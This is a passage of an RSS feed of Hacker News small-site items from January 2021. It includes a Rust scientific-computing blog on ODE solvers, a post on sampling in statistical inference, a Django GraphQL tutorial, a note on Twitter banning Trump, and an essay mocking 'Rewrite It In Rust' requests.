<p>UPDATE January 8: Twitter permanently banned Trump’s account. Google removed Parler, an app like Twitter used by Trump supporters, from the Android app store to make it harder for people to download it, saying Google requires social media apps to have content moderation policies to remove posts that incite violence.</p>
</div>
</div>		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807656</guid>
            <pubDate>Sun, 17 Jan 2021 02:56:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tragedy of Gemini]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25807633">thread link</a>) | @panic
<br/>
January 16, 2021 | https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html | <a href="https://web.archive.org/web/*/https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807633</guid>
            <pubDate>Sun, 17 Jan 2021 02:52:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Maybe considered harmful, or stories about error information loss]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807542">thread link</a>) | @panic
<br/>
January 16, 2021 | https://rpeszek.github.io/posts/2021-01-16-maybe-harmful.html | <a href="https://web.archive.org/web/*/https://rpeszek.github.io/posts/2021-01-16-maybe-harmful.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <section>
        Posted on January 16, 2021
        
            by Robert Peszek
        
        
        
    </section>
    
    <section>
        <p><strong>… or stories about error information loss </strong></p>
<p>Due to the negative reaction to the title (<a href="https://www.reddit.com/r/haskell/comments/kyo4xk/maybe_considered_harmful/gji0235?utm_source=share&amp;utm_medium=web2x&amp;context=3" target="_blank">reddit</a>) this has been re-posted as <a href="https://rpeszek.github.io/posts/2021-01-17-maybe-overuse.html">Maybe Overuse, Stories About Error Information Loss</a>.</p>
    </section>
</article></div>]]>
            </description>
            <link>https://rpeszek.github.io/posts/2021-01-16-maybe-harmful.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807542</guid>
            <pubDate>Sun, 17 Jan 2021 02:34:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scientific Computing in Rust]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25807341">thread link</a>) | @mort96
<br/>
January 16, 2021 | https://aftix.xyz/home/bacon/ | <a href="https://web.archive.org/web/*/https://aftix.xyz/home/bacon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>While getting my degree in Physics, I had to take classes in both MatLab and Python
for scientific computing. I preferred python, where we used the SciPy and NumPy
packages. In fact, I used those packages again (along with matplotlib) in an
undergraduate research project simulating bacteria films. There's a catch: I was
also pursuing a degree in Computer Science, and Python just wasn't fast enough
for that side of me, so, during my free time in graduate school, I rewrote my biofilm
simulation in my new favorite language, Rust.</p>
<p>First problem: I needed to replace
<code>jsonpickle</code> for data serialization. This problem was easy, as the <code>serde</code> crate
is an amazing replacement (I even transitioned from JSON to Rusty Object Notation, RON).
Second problem: Should I try to get matplotlib bindings in Rust or should I use
a more Rust-y plotting library? I decided on the latter, finding <code>plotters</code> to be
a suitable replacement for matplotlib. Last problem: How do I replace the differential
equation solvers of SciPy? I ended up writing a custom predictor-corrector solver
which worked well enough, giving identical simulation results while being five
hundred times faster than my python code at just the simulation step, rendering
not included (plotting directly to an RGB buffer then using libx264 bindings to
generate raw H.264 frames that mpv can understand also gave a similar speedup to
the rendering step over writing out every frame as a png file in matplotlib and
using a shell script to ffmpeg the outputs together). Full disclosure, a large part
of this speedup probably comes from my <em>derivative</em> function being not-python, rather
than my implementation of a differential equation solver over SciPy's. Furthermore,
I only breached the five hundred barrier when switching to using a QuadTree to
find the nearest neighbors of a bacteria, before that the speed up was more in
the three hundreds. This port of my old project can be found <a href="https://github.com/aftix/rustfilm">here</a>
if you care for some reason.</p>
<h2>Introducing bacon-sci</h2>
<p>Inspired, I decided to start on a full SciPy replacement in rust as I could not find
one I liked on crates.io (I later found the <code>peroxide</code> crate). I even had a clever name:
<a href="https://github.com/aftix/bacon">bacon</a>, named after Francis Bacon and the pork based food; however, <code>bacon</code> is already
a crate, so I went for the next best thing: <a href="https://crates.io/crates/bacon-sci">bacon-sci</a>.</p>
<p>I started out with the easiest part. SciPy has a set of scientific constants from
the NIST. I just took the list of important constants from SciPy and put it in a module.
In addition, I took NIST's CODATA and put it into a global map that corresponds a
String of the constant's name to a triplet: an f64 of its value, an f64 of its uncertainty,
and a String of its units. How do you make a static map? I just used the <code>lazy_static</code>
crate.</p>
<p>Next, I returned to the area that inspired me: initial value problems. After that,
I tackled root finding and polynomials. Lastly, as of now, I implemented a few special
polynomials and numeric differentiation. Armed with a copy of Burden and Faires's
"Numerical Analysis (8th ed.)", Wikipedia, and SciPy source code, I went to work.</p>
<p>The first decision I made was to use a linear algebra crate, specifically <code>nalgebra</code>.
I have written many vector and matrix implementations in the past, and I didn't feel
like doing it this time. Besides, <code>nalgebra</code> is probably faster than anything I
can write.</p>
<p>The next decision was using the <code>alga</code> crate to handle generics
of complex types and real types. I wanted all algorithms that could work on
complex numbers to be able to, so most of the functions in <code>bacon-sci</code> work on
<code>N: ComplexField</code>. If an algorithm requires a parameter to be well-ordered (like time),
then it is a <code>N: RealField</code>. In cases where a function takes both, the generic parameter
is a <code>N: ComplexField</code> with the real parameters being <code>N::RealField</code>, which is the real
"backing type" of the possibly complex field. Some functions require complex arithmetic,
so they automatically upgrade from <code>N: ComplexField</code> to <code>Complex&lt;N::RealField&gt;</code> from
<code>num_complex</code>.</p>
<p>Interestingly, there are cases where I wanted to automatically
downgrade from definitely complex back to "maybe complex", which was more difficult
than the other way. To upgrade, all I needed was <code>Complex::&lt;N::RealField&gt;::new(z.real(), z.imaginary())</code>,
where <code>z</code> is a possibly complex value,
with real types giving zero on the imaginary component. To go the other way, I decided
to basically take the real component and ignore the imaginary component. To do this from
a <code>N: ComplexField</code> I had to check if <code>N::RealField == N</code> to see if <code>N</code> was real
or complex. To do this, I used <code>TypeId::of::&lt;N::RealField&gt;() == TypeId::of::&lt;N&gt;()</code>.
If <code>N</code> was real, converting from complex was easy: use <code>ComplexField::from_real</code> on
the real component, ignoring the imaginary. On the other hand, if <code>N</code> was complex,
the conversion needed to preserve the imaginary component. <code>ComplexField</code> has no
<code>from_imaginary</code>, so I directly implemented \( a + bi \) with
<code>ComplexField::from_real(z.re) + (-ComplexField::one()).sqrt() * ComplexField::from_real(z.im)</code>,
with <code>z</code> being the definitely complex value.</p>
<h2>Euler Method</h2>
<p>A differential equation is an equation describing a thing in terms of how
that thing changes. For those unfamiliar, <a href="https://www.youtube.com/watch?v=p_di4Zn4wz4">this</a>
is a good introduction. In order to solve a differential equation, you need some conditions.
These come in two flavors: boundary conditions and initial values, with both names
being self-describing. My second task on <code>bacon-sci</code> was to implement algorithms
that solve initial value differential equations, referred to as initial value
problems or <code>ivp</code> in the code.</p>
<p>Abstractly, the system of differential equations can be written, with an arrow
representing a vector quantity, as
\[ \frac{\mathrm{d}\vec{y}}{\mathrm{d}t} = f(t, \vec{y}) . \]
This is a first-order system of differential equations since
only the first derivative is present. Generally, many higher-order
equations can be reduced to first-order by thinking of each derivative
as a new variable. The initial condition is then represented as
\[ \vec{y}(t_0) = \vec{y}_0 \]</p>
<p>These equations immediatly lead to the first algorithm
for solving initial value problems, Euler's method. Consider
this question: given a timestep \( \Delta t \), what is the
corresponding \( \Delta \vec{y} \)? We can approximate
\( \Delta \vec{y} / \Delta t \approx \mathrm{d}\vec{y}/\mathrm{d}t = f(t, \vec{y}) \),
(that is, use the tangent line to estimate the function),
leading to \( \Delta \vec{y} = f(t, \vec{y} )\Delta t \). This gives us an iterative
algorithm, \( \vec{y}_{i + 1} = \vec{y}_{i} + f(t, \vec{y})\Delta t \). This
is Euler's method. From the starting conditions, pick a timestep and iterate until
you reach the end.</p>
<p>So how good is Euler's method? Not very good. As an example, imagine solving
a mechanics differential equation with positions and velocities. Conservation
of energy says that energy should be conserved. Will Euler's method conserve
energy? In general, it will not. Energy in Euler's method tends to explode.
One solution to this is to use a slightly different version of the algorithm
known as Euler-Cromer or the semi-implicit Euler's method. In this method,
velocities are updated first, then positions are updated using the new velocities
(in Euler's method, you'd use the old velocities). Euler-Cromer is much better,
tending to conserve energy, especially in spring systems. According to Gaffer on Games,
game physics tend to use the Euler-Cromer as it only requires calculating the derivative
once but gives much better results than Euler's.</p>
<h2>Runge-Kutta Methods</h2>
<p>One problem with Euler's method is that the error in each step is linear in the
step size. We can do better. To start with, remember Taylor series from
basic calculus. That is, remember you can approximate a function of one
variable like
\[
f(x) = f(x_0) + f'(x_0) (x - x_0) + \frac{f''(x_0)}{2} {(x - x_0)}^2 + \ldots .
\]
Similarly, we can approximate our derivative function from the last section with
\[
f(t, \vec{y}) = f(t_0, \vec{y}_0)
+ \left((t - t_0)\frac{\partial f}{\partial t}(t_0, \vec{y}_0)
+(\vec{y} - \vec{y}_0)\frac{\partial f}{\partial \vec{y}}(t_0, \vec{y}_0)\right)
+ \ldots ,
\]
where the powers of our vectors are done element-wise. Additionally, Taylor's Theorem
bounds the error via some small parameters \(\xi, \mu\).
In this light, we can say Euler's method is a zeroth order approximation, which is
why the error is linear. You can use Taylor polynomials for better IVP solvers, but
this requries information about the derivatives of \(f\). Instead, Runge-Kutta
methods allow for tighter error bounds without using the derivative.</p>
<p>To see an example of this, I will derivethe midpoint method here. Imagine for a
moment that instead of taking a full timestep, you take a partial timestep and use
\(f\) at that point to approximate the second Taylor polynomial. That is, choose
a \(a_1, \alpha_1, \beta_1\) so that \(a_1 f(t + \alpha_1, \vec{y} + \beta_1)\)
approximates
\[
T^{(2)}(t, \vec{y}) = f(t, \vec{y}) + \frac{h}{2}f'(t, \vec{y}),
\]
where \(h\) is the timestep, with quadratic error in the timestep.
Note that \(f'(t, y) = \partial f/\partial t(t, \vec{y})
+ \partial f/\partial \vec{y}(t, \vec{y}) \vec{y}'(t) \).
Thus,
\[
T^{(2)} = f(t, \vec{y}) + \frac{h}{2}\frac{\partial f}{\partial t}f(t, \vec{y})
+ \frac{h}{2}\frac{\partial f}{\partial \vec{y}}(t, \vec{y}) f(t, \vec{y}) .
\]
Expanding \(a_1 f(t + \alpha_1, \vec{y} + \beta_1)\) via Taylor series gives
\[
a_1 f(t, \vec{y}) + a_1 \alpha_1 \frac{\partial f}{\partial t}(t, \vec{y})
+ a_1\beta_1 \frac{\partial f}{\partial y}(t, y) .
\]
Thus, \(a_1 = 1\), \(a_1 \alpha_1 = h/2\), and \(a_1 \beta_1 =
f(t, \vec{y}) h / 2\). This uniquely determines the coefficients, giving rise to
the midpoint method:
\[
\vec{y}_{i + 1} = \vec{y}_i + hf\left(t_i + \frac{h}{2}, \vec{y}_i + \frac{h}{2}f\left(t_i, \vec{y}_i\right)\right) .
\]</p>
<p>This process can be repeated for higher order polynomials. The classic
Runge-Kutta method is order 4, and is used as follows:
\[
\vec{k}_1 = hf(t_i, \vec{y}_i),
\]</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aftix.xyz/home/bacon/">https://aftix.xyz/home/bacon/</a></em></p>]]>
            </description>
            <link>https://aftix.xyz/home/bacon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807341</guid>
            <pubDate>Sun, 17 Jan 2021 01:56:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Motivations for Sampling in Statistical Inference]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807246">thread link</a>) | @keyboardman
<br/>
January 16, 2021 | https://leimao.github.io/blog/Statistical-Sampling-Motivations/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Statistical-Sampling-Motivations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Sampling is very common in the society to model distributions and estimate variables. For a very common example, we randomly sample a large quantity of families to model the family income distribution and estimate the mean of family income. Here, family income is something that can be directly measured therefore estimating the mean of family income from the samples is not very interesting. Whatâ€™s interesting is that if we want to model the family income distribution and there must be some latent variables or variables that are dependent on the latent variables that can hardly be directly observed from the samples, what the most likely values, i.e., the expected values, for these variables are. This process is sometimes called statistical inference.</p>



<p>The result of statistical inference could be further used for estimating some additional variables. However, unfortunately determining the expected values for these variables during statistical inference is difficult if the model is non-trivial.</p>



<p>In this blog post, I would like to discuss why determining the expected values for these variables is difficult and how to approximate the expected values for these variables by sampling.</p>

<h3 id="statistical-inference">Statistical Inference</h3>

<h4 id="expected-values">Expected Values</h4>

<p>Suppose we have a multivariate joint distribution $P(X_1, X_2, \cdots, X_n)$ and the mathematical form of the multivariate joint distribution is known. We will use $X = \{X_1, X_2, \cdots, X_n\}$ in this article for brevity. Sometimes, we would like to compute the expected values of $\mathbb{E}_{P(X)} \big[f(X_1, X_2, \cdots, X_n)\big]$ for some function $f$. For example, we would like to compute the expected value of the mean of $X_1, X_2, \cdots, X_n$, i.e., $\mathbb{E}_{P(X)} \big[ \frac{1}{n} \sum_{i=1}^{n} X_i \big] $.</p>



<p>Using the property of expected values,</p><p>

\[\begin{align}
\mathbb{E}_{P(X)} \bigg[ \frac{1}{n} \sum_{i=1}^{n} X_i \bigg] 
&amp;= \frac{1}{n} \sum_{i=1}^{n} \mathbb{E}_{P(X)} \big[ X_i \big] \\
&amp;= \frac{1}{n} \sum_{i=1}^{n} \int_{x \in X_i}^{} P( X_i = x ) x dx \\
\end{align}\]

</p><p>According to the property of total probability,</p><p>

\[\begin{align}
P(X_i ) &amp;= \int_{x_1 \in X_1} \int_{x_2 \in X_2} \cdots \int_{x_{i-1} \in X_{i-1}} \int_{x_{i+1} \in X_{i+1}} \cdots \int_{x_n \in X_n} \\
&amp; \quad P(X_1 = x_1, X_2 = x_2, \cdots, X_{i-1} = x_{i-1}, X_i, X_{i+1} = x_{i+1}, \cdots, X_n = x_n) \\
&amp; \quad d x_1 d x_2 \cdots d x_{i-1} d x_{i+1} \cdots d x_n \\
&amp;= \oint_{X - X_i} P(x_1, x_2, \cdots, x_{i-1}, X_i, x_{i+1}, \cdots, x_n = x_n) \prod_{j \neq i} d x_j
\end{align}\]

</p><p>Usually the form of $P(X_1, X_2, \cdots, X_n)$ is non-trivial, and this integral will immediately become intractable to derive if the number of variables $n$ becomes large. The reader might check such an <a href="https://leimao.github.io/article/Introduction-to-Variational-Inference/">example</a> in variational inference.</p>



<p>Now we are stuck. We could not compute the expected value of the mean of $X_1, X_2, \cdots, X_n$, even if the joint distribution is known, because we cannot derive the conditional probability distribution $P(X_i)$ for each single variable $X_i$.</p>

<h4 id="approximate-by-sampling">Approximate By Sampling</h4>

<p>Although we cannot derive the conditional probability distribution $P(X_i)$ and further the expected value of some of the functions of variables that we are interested, if we can get some multivariate samples from the distribution $P(X_1, X_2, \cdots, X_n)$, we can empirically determine the distribution of $P(X_i)$ and its statistics, such as the expected value, from the samples.</p>



<p>Going back to the example of computing the expected value of the mean of the variables, if we can get $N$ samples, $x^{(1)}, x^{(2)}, \cdots, x^{(N)}$ where $x^{(i)} = \{x_1^{(i)}, x_2^{(i)}, \cdots, x_n^{(i)}\}$, from $P(X_1, X_2, \cdots, X_n)$, because the law of large numbers, the mean of the variables could be estimated as the mean of the mean of the variables in the samples. Concretely,</p><p>

\[\begin{align}
\mathbb{E}_{P(X)} \bigg[ \frac{1}{n} \sum_{i=1}^{n} X_i \bigg] 
&amp;= \frac{1}{n} \sum_{i=1}^{n} \mathbb{E}_{P(X)} \big[ X_i \big] \\
&amp;\approx \frac{1}{n} \sum_{i=1}^{n} \frac{1}{N} \sum_{j=1}^{N} x_i^{(j)} \\
&amp;= \frac{1}{nN} \sum_{i=1}^{n} \sum_{j=1}^{N} x_i^{(j)} \\
\end{align}\]

</p><p>More generally, if we are interested in the expected value of a random variable $f(X)$ and the (posterior) distribution $P(X)$, given $N$ samples, $x^{(1)}, x^{(2)}, \cdots, x^{(N)}$, we could estimate expected value of a random variable as</p><p>

\[\begin{align}
\mathbb{E}_{P(X)} \approx \frac{1}{N} \sum_{i=1}^{N} f(x^{(i)})
\end{align}\]

</p><h4 id="sampling-methods">Sampling Methods</h4>

<p>Now the most important question becomes how to generate samples from a complex multivariate joint distribution. We could imagine, without special methods, we could not even write a program to do samplings from a â€œsimpleâ€� multivariate Gaussian distribution easily. There are sampling methods such as Gibbs sampling and Metropolis-Hastings algorithm to do a sequence of sampling from conditional univariate distributions that approximates the sampling from the multivariate joint distribution. I will write additional articles on these methods in the future.</p>

<h3 id="conclusion">Conclusion</h3>

<p>Sampling is critical for statistical inference, especially from a multivariate joint posterior distribution for latent variables. The samples could be used for estimate variables, approximate joint distributions or marginal distributions.</p>

<h3 id="quiz">Quiz</h3>

<h4 id="how-to-do-sampling-from-a-univariate-distribution-using-an-existing-uniform-sampler">How to do sampling from a univariate distribution using an existing uniform sampler?</h4>

<p>A simple approach is to derive the cumulative distribution function (CDF) $F_X(X = x) = P(X \leq x) = y \in [0, 1]$ for the univariate distribution $P(X)$, if CDF does exist. The inverse CDF is $F_X^{-1}(Y)$. Then with the uniform sampler $Y \sim U[ 0, 1 ]$, $F_X^{-1}(Y)$ has the same distribution as $P(X)$.</p>



<p><em>Proof</em></p><p>

\[\begin{align}
F_Y(y) &amp;= P(Y \leq y) \\
&amp;= P(F_X(x) \leq y) \\
&amp;= P(X \leq F_X^{-1}(y)) \\
&amp;= F_X(F_X^{-1}(y)) \\
&amp;= y
\end{align}\]

\[\begin{align}
P(Y = y) &amp;= \frac{dF_Y}{d_Y}(y) \\
&amp;= 1 \\
\end{align}\]

</p><p>Therefore, for any distribution $P(X)$, $F_X(X) = Y \sim U[0, 1]$. The inverse function $X = F_X^{-1}(Y)$ maps from variable $Y$ to $X$, so $F_X^{-1}(Y)$ has the same distribution as $X$.</p>

<h4 id="why-for-some-modern-deep-models-doing-sampling-is-not-very-difficult-during-inference">Why for some modern deep models, doing sampling is not very difficult during inference?</h4>

<p>Many models, such as image semantic segmentation models, are maximizing $P(Y_1, Y_2, \cdots, Y_n | X_1, X_2, \cdots, X_m) = \prod_{i=1}^{n} P(Y_i | X_1, X_2, \cdots, X_m)$ during training, and during inference sampling from each of the univariate distribution $P(Y_i | X_1, X_2, \cdots, X_m)$ is relatively simple. Some other models, such as recurrent neural networks for language modeling, are maximizing $P(X_1, X_2, \cdots, X_n) = P(X_1) P(X_2 | X_1) \cdots P(X_n | X_1, X_2, \cdots, X_{n-1})$ during training, and during inference sampling from each of the univariate distribution $P(X_i | X_1, X_2, \cdots, X_{i-1})$ is relatively simple.</p>

      <hr>
      
    </div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/Statistical-Sampling-Motivations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807246</guid>
            <pubDate>Sun, 17 Jan 2021 01:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Django and GraphQL: Learn How to Build a Django GraphQL API]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807197">thread link</a>) | @vibrus
<br/>
January 16, 2021 | https://workly.dev/tutorials/django-and-graphql-learn-how-to-build-a-django-graphql-api/ | <a href="https://web.archive.org/web/*/https://workly.dev/tutorials/django-and-graphql-learn-how-to-build-a-django-graphql-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                         
                        <h2>What is GraphQL</h2>
<p>In short, <a title="GraphQL" href="https://amzn.to/2JCioQm" target="_blank" rel="noopener">GraphQL</a> is an API query language and a server-side runtime for executing queries by using a defined data type system. It was developed at Facebook in 2012 before they released it to the public in 2015. GraphQL's primary goal wat to address the shortcomings of RESTful APIs. To provide more control over the data, how it is requested, and how it is returned. One thing I admire GraphQL for is the fact that you only use one endpoint, whereas on REST you use many numerous API endpoints.</p>
<p>To learn more about GraphQL, There is a list of <a title=" GraphQL tutorials " href="https://workly.dev/tutorials/technology/graphql/">GraphQL tutorials </a>on this blog which you can follow and learn.&nbsp;</p>

<h2>What is Django</h2>
<p><a title="Django" href="https://workly.dev/tutorials/django-web-framework-how-to-create-a-django-blog/">Django</a> is an open-source, python web framework that follows the Model-Template-View architecture.&nbsp; It advocates for rapid development, clean, and pragmatic design. You can use Django to build backend/APIs,&nbsp; small scale web applications, and large scale web applications. Django comes with a lot of functionalities and so you can complete a project very fast. It is fast, secure, and highly scalable.</p>



<h2>What is an API</h2>
<p>An API (Application Programming Interface) is a service, kind of software, that allows two separate software or components of software to talk to each other ie to share data. Modern web applications have a backend that acts as the API and a frontend that serves the data from the backend or API.</p>

<h2>Creating the Django GraphQL API</h2>
<p>This tutorial is going to be a continuation of the tutorial where we <a title="learnt how to build a Django blog" href="https://workly.dev/tutorials/django-web-framework-how-to-create-a-django-blog/" target="_blank" rel="noopener">learned how to build a Django blog</a>. I'm going to assume you have already build Django blog projects, created an article application, and created the models, views, and URLs.</p>
<p>To continue from where we left off, we need one python package, Django graphene. So inside the root directory of your blog project, open a terminal, and run the following commands.</p>

<pre><code>source env/bin/activate
pip install graphene-django</code></pre>

<p>We have activated the virtual environment and installed graphene-django in our virtual env.</p>
<p>Now open your <span>blog/settings.py</span> and add the Django graphene application under installed applications.</p>

<pre><code>INSTALLED_APPS = [
    ...
    "django.contrib.staticfiles", # Required for GraphiQL
    "graphene_django"
]</code></pre>

<p>We now need to update our <span>blog/urls.py</span> file to add the graphql endpoint. So open the root urls.py file under blog i.e <span>blog/urls.py</span> and add the following code.</p>

<pre><code>from django.urls import path
from django.views.decorators.csrf import csrf_exempt

from graphene_django.views import GraphQLView

urlpatterns = [
    # ...
    path("graphql/", csrf_exempt(GraphQLView.as_view(graphiql=True))),
]</code></pre>

<h3>GraphQL Schema and Object Types</h3>
<p>Inside the articles application create a <span>schema.py</span> and <span>types.py&nbsp;</span> file i.e under <span>article/schema.py</span>.</p>

<pre><code>touch article/schema.py
touch article/types.py</code></pre>

<p>Open the <span>types.py</span> first and add the following code.</p>

<pre><code>from graphene_django import DjangoObjectType
from article.models import Article

class ArticleType(DjangoObjectType):
    class Meta:
        model = Article</code></pre>

<p>You have created the Articles object type. Now open the <span>schema.py</span> file and add the following code.&nbsp;</p>

<pre><code>import graphene
from article.types import ArticleType
from article.models import Article

class Query(graphene.ObjectType):
    articles = graphene.List(ArticleType)

    def resolve_articles(self, info):
        return Article.objects.all()
</code></pre>



<p>Now let's create another <span>schema.py </span>file inside the blog project. The one with settings.py. Add the following code.</p>

<pre><code>import graphene
import article.schema

class Query(article.schema.Query, graphene.ObjectType):
    pass

schema = graphene.Schema(query=Query)</code></pre>

<p>Update your <span>settings.py</span> file and add the following code at the bottom which will point to the root schema.py we've just created.</p>

<pre><code>GRAPHENE = {
    "SCHEMA": "blog.schema.schema",
}</code></pre>

<p>After saving the file, restart your server and go to /graphql endpoint, you'll be able to see your GraphQL playground there.</p>



                         
                    </div></div>]]>
            </description>
            <link>https://workly.dev/tutorials/django-and-graphql-learn-how-to-build-a-django-graphql-api/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807197</guid>
            <pubDate>Sun, 17 Jan 2021 01:26:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Have you considered Rewriting It In Rust? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807127">thread link</a>) | @CyberRabbi
<br/>
January 16, 2021 | http://transitiontech.ca/random/RIIR | <a href="https://web.archive.org/web/*/http://transitiontech.ca/random/RIIR">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div id="main">
        
        
        <div id="content" data-role="content"> 
<p>My first proper programming language was C.
It was super confusing, and I wrote some terrible code that didn't really do anything terribly useful.</p>
<p>Along the way, however, I learned a bit about how computers do things, sort of.
I say sort of because <a href="http://programmers.stackexchange.com/questions/267583/why-is-c-still-in-the-category-of-high-level-language" title="If you disagree, please voice your dissent in my comment section">C is a <em>high level language</em></a>.</p>
<p>Of course, there are <em>higher-level</em> languages, and those end up being really good for a very wide array of tasks, so I went and learned them, and then I started actually getting things done.
I'm glad I started with C, though, since it gave me an idea of what these other languages must be doing under the hood to accomplish so much with so little code.</p>
<p>Using Scheme, Python, or Javascript, I didn't have to bother with managing the computer's memory allocation manually, and that turned out to be a lot more fun.</p>
<p>At some point a while back, I heard about <a href="https://www.rust-lang.org/">Rust-lang</a>.</p>
<p>What is Rust?</p>
<blockquote>
<p>Rust is a systems programming language that runs blazingly fast, prevents segfaults, and guarantees thread safety. </p>
</blockquote>
<h2 id="sounds-good-right">Sounds good, right?</h2>
<p>Yea, actually.</p>
<p>I think it's a pretty awesome language.
The problem is, I make my living writing stuff working on web apps, and that means writing Javascript.
That's not a problem, necessarily, but I just don't have much use for a language like Rust.</p>
<p>It definitely seems awesome, and as a lisp aficionado, I love a lot of its high level concepts.
As I recall, Rust even has properly nesting block comments, which I find quite practical.</p>
<h2 id="where-am-i-going-with-this">Where am I going with this?</h2>
<p>Well, I just wanted to clear up that I don't think Rust is a bad language.
I'm not going to criticize <em>Rust</em> in this article, however, I am going to criticize a part of the community surrounding the language.</p>
<p>To be honest, actually, I'm not really sure the people I'm going to criticize are even a part of the community.
At best, they seem to be a part of the fringe.</p>
<p>Who are these people?</p>
<p>They are the people who show up unannounced on your software project's doorstep (probably your issue tracker) and ask the following question:</p>
<blockquote>
<p>Have you considered <em><strong>Rewriting It In Rust</strong></em>?</p>
</blockquote>
<h2 id="yes-im-starting-a-language-flame-war">Yes, I'm starting a language flame war</h2>
<p>Ok, here we go.</p>
<p>If you've spent any time at all in a community where programmers hang out, you've probably seen a flame war over which language is best.</p>
<p>I don't know which language is best, though I've argued for Scheme many times because nobody else seems to be doing it.</p>
<p>That being said, I've noticed that this particular subset of the Rust community seems to do this particular thing often enough that it's nearly the only thing that I know about the Rust community.</p>
<p>I've joked about it with friends and coworkers, and sure enough, most of them have witnessed it in the wild.</p>
<p>I believe the first time I saw it was on the (now disabled) <a href="https://github.com/cjdelisle/cjdns">cjdns</a> issue tracker.</p>
<p>I was lucky enough to have the tracker turned on for long enough that I was able to get a screenshot:</p>
<p><img src="http://transitiontech.ca/assets/riir/cjdns-eventually-moving-to-rust.jpg" alt="" title="'prevent thread problems' in software that runs on one thread... yea"></p>
<p>It all started and ended pretty quickly.
Some <em>Rustafarian</em> asked a question, and the author (<a href="https://github.com/cjdelisle">@cjdelisle</a>) answered somewhat sarcastically.</p>
<p>Once OP figures out that their brilliant idea is not being taken seriously, they get annoyed and leave.</p>
<h2 id="but-wait-theres-more">But wait, there's more</h2>
<p>Yea, of course it goes on.
I heard it a few more times, laughed about it (oh, this again), and then continued on with my life.</p>
<p>Of course, clearly it happened enough times that I started to notice a trend, because as I mentioned, I've joked about it with people, and they've noticed it too.</p>
<p>So, this morning (<strong>2016-03-22</strong>) I saw <a href="https://github.com/fc00/go-fc00/issues/1">a thread</a> in a repo I'm watching, and there it was again:</p>
<p><img src="http://transitiontech.ca/assets/riir/go-fc00-why-go.jpg" alt="" title="...my actual question was about building a maybe more valuable solution..."></p>
<p>Once again, my friends make some snappy comments.
Pair those with a classic <em>if you want it written why don't you write it</em>, a few more <em>lulz</em> and our <em>Rustacean</em> acquaintance gets annoyed:</p>
<blockquote>
<p>ok, didn't thought a simple question would attract that much angry trolls.</p>
</blockquote>
<p>..and things pretty much die out.</p>
<h2 id="but-then-i-started-thinking">But then I started thinking</h2>
<p>We joked about it on IRC, and a few more people comment that they've also seen this in the wild, and quickly enough we find that we need an acronym because <em>Rewrite It In Rust</em> takes too long to type and so <strong>RIIR</strong> is born.</p>
<p>So, naturally, once an acronym is born, we have a meme, and memes like to spread.
So, naturally, I start digging:</p>
<blockquote>
<p>Who else has been hit by this storm that has been sweeping the web?</p>
</blockquote>
<h3 id="nix">Nix</h3>
<p>Apparently there were a few threads like <a href="http://lists.science.uu.nl/pipermail/nix-dev/2015-December/019040.html">this one</a> which went on for a while.
I haven't checked the exact timelines, but since this is a language flame war, I'm sure somebody will leap in to do that research for me.</p>
<p><img src="http://transitiontech.ca/assets/riir/nix-dev-perl-to-rust.jpg" alt="" title="Rust does this very well, to the point where me enumerating its benefits would be redundant."></p>
<h3 id="tor">Tor</h3>
<p>Yup, Tor, the very large, critical infrastructure that keeps journalists, criminals, schizophrenics, and <del>piracy</del> privacy activists anonymous has been <a href="https://trac.torproject.org/projects/tor/ticket/11331">asked to rewrite their software</a>.</p>
<p><img src="http://transitiontech.ca/assets/riir/rewrite-tor-in-rust.jpg" alt="" title="Writing C code that is safe is super hard (even for exeperienced Tor devs)"></p>
<h2 id="more-still">More still...</h2>
<p>Why not <a href="https://www.quora.com/Would-it-be-possible-advantageous-to-rewrite-the-Linux-kernel-in-Rust-when-the-language-is-stable" title="this one isn't on an issue tracker, at least">rewrite the Linux Kernel</a>? I'd love to hear Linus's answer to this.</p>
<p>Then of course there's <a href="https://news.ycombinator.com/item?id=11337399">this comprehensive thread</a> on Hacker News covering a bunch of angles on the pros and cons of this meme.</p>
